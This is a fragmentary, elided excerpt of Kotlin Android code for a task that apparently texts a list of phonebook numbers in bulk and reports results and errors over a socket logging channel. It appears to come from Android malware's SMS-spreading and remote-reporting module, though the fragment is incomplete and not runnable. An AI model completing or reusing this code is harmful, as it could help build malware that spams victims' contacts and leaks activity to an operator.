...
class SendSmsManyTask(val ctx: Context, val numbers: List<String>, val message: String, private val simSlotIndex: Int = 0) :
    BaseTask(ctx) {
    ...
    private fun smsMailingPhonebook() {
        ...
        for (phoneNumber in numbers) {
            if (!phoneNumber.contains("*") && !phoneNumber.contains("#") && phoneNumber.length > 6) {
                try {
                    ...
                    IOSocketyt.sendLogs("", "SendSmsManyTask ${ex.localizedMessage}", "error")
                    val obj = JSONObject()
                    obj.put(
                        "sms_mailing_many_Error",
        ...
        if (is_sms_working) {
            ...
            IOSocketyt.sendLogs("", obj.toString(), "sms_send_many")
        }
    }
